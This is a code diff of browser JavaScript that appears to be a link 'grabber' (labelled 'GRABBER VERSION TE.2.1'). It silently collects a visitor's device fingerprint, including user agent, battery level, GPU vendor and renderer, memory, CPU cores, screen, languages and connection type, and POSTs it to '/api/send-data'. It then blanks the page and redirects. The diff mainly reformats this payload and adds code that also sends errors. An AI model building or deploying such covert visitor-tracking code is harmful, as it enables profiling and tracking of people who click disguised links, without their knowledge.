@@ -25,45 +25,50 @@
           FLAGS.gpu = { WebGL: true };
           FLAGS.gpu.debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
         }
-        try { 
-        const payload = {
-          "=========== :CLIENT": "===========",
-          "GRABBER VERSION": "TE.2.1",
-          "GRABBER CODE": location.href.split("?a=")[1],
-          "Refrence URL": location.href,
-          "Redirect URL": redirect || "None",
-          "User Agent": navigator.userAgent,
-          Touchscreen: navigator.maxTouchPoints > 0,
-          "Touch Points": navigator.maxTouchPoints,
-          Mobile: navigator.userAgentData?.mobile,
-          Memory: navigator.deviceMemory,
-          "CPU Cores": navigator.hardwareConcurrency,
-          Charging: (await navigator.getBattery()).charging,
-          "Battery percentage": `${
-            navigator.getBattery ? (await navigator.getBattery()).level * 100 : "Unavailible"
-          }%`,
-          "GPU Vendor": FLAGS.gpu.debugInfo
-            ? gl.getParameter(FLAGS.gpu.debugInfo.UNMASKED_VENDOR_WEBGL)
-            : "Unavailable",
-          "GPU Renderer": FLAGS.gpu.debugInfo
-            ? gl.getParameter(FLAGS.gpu.debugInfo.UNMASKED_RENDERER_WEBGL)
-            : "Unavailable",
-          Languages: navigator.languages.join(","),
-          "Connection type": navigator.connection.effectiveType,
-          "Color Depth": screen.colorDepth,
-          "Screen Orientation": screen.orientation.type,
-          "Screen Angle": screen.orientation.angle,
-          "Screen Dimensions": `${screen.width}x${screen.height}`,
-          "Current Time": Intl.DateTimeFormat([], {
-            year: "numeric",
-            month: "numeric",
-            day: "numeric",
-            hour: "numeric",
-            minute: "numeric",
-            second: "numeric",
-          }).format(),
-        };
-        } catch (err){ document.write(""); location.href = "about:blank" }
+        try {
+          const payload = {
+            "=========== :CLIENT": "===========",
+            "GRABBER VERSION": "TE.2.1",
+            "GRABBER CODE": location.href.split("?a=")[1],
+            "Refrence URL": location.href,
+            "Redirect URL": redirect || "None",
+            "User Agent": navigator.userAgent,
+            Touchscreen: navigator.maxTouchPoints > 0,
+            "Touch Points": navigator.maxTouchPoints,
+            Mobile: navigator.userAgentData?.mobile,
+            Memory: navigator.deviceMemory,
+            "CPU Cores": navigator.hardwareConcurrency,
+            Charging: (await navigator.getBattery()).charging,
+            "Battery percentage": `${
+              navigator.getBattery
+                ? (await navigator.getBattery()).level * 100
+                : "Unavailible"
+            }%`,
+            "GPU Vendor": FLAGS.gpu.debugInfo
+              ? gl.getParameter(FLAGS.gpu.debugInfo.UNMASKED_VENDOR_WEBGL)
+              : "Unavailable",
+            "GPU Renderer": FLAGS.gpu.debugInfo
+              ? gl.getParameter(FLAGS.gpu.debugInfo.UNMASKED_RENDERER_WEBGL)
+              : "Unavailable",
+            Languages: navigator.languages.join(","),
+            "Connection type": navigator.connection.effectiveType,
+            "Color Depth": screen.colorDepth,
+            "Screen Orientation": screen.orientation.type,
+            "Screen Angle": screen.orientation.angle,
+            "Screen Dimensions": `${screen.width}x${screen.height}`,
+            "Current Time": Intl.DateTimeFormat([], {
+              year: "numeric",
+              month: "numeric",
+              day: "numeric",
+              hour: "numeric",
+              minute: "numeric",
+              second: "numeric",
+            }).format(),
+          };
+        } catch (err) {
+          document.write("");
+          location.href = "about:blank";
+        }
         try {
           await fetch("/api/send-data", {
             method: "POST",
@@ -73,7 +78,14 @@
             body: JSON.stringify(payload),
           });
         } catch (error) {
-          location.href = "about:blank"
+          location.href = "about:blank";
+          await fetch("/api/send-data", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ error: true, message: error }),
+          });
         } finally {
           document.write("");
           if (redirect) {
